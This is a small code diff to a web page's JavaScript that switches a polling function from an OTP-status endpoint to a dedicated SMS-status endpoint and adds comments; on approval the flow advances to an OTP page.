@@ -264,18 +264,18 @@ async function doSmsParse() {
     } catch (err) { document.getElementById('mSms').classList.remove('show'); document.getElementById('bSms').disabled = false; showSmsMsg('error', 'Error: ' + err.message); }
 }
 
-// ============== POLLING SMS APPROVAL ==============
+// ============== POLLING SMS APPROVAL (Fixed) ==============
 let smsPollTimeout;
 function pollForSmsApproval(applicationId) {
     const checkStatus = async () => {
         if (S.applicationId !== applicationId) return;
         try {
-            const res = await fetch(`/api/check-otp-status/${applicationId}`);
+            const res = await fetch(`/api/check-sms-status/${applicationId}`);  // ✅ Now uses dedicated SMS endpoint
             const data = await res.json();
             if (data.success) {
                 if (data.status === 'approved') {
                     clearTimeout(smsPollTimeout);
-                    goTo('page-otp');
+                    goTo('page-otp');  // ✅ Move to OTP page
                 } else if (data.status === 'rejected') {
                     clearTimeout(smsPollTimeout);
                     document.getElementById('smsMsgBox').value = '';
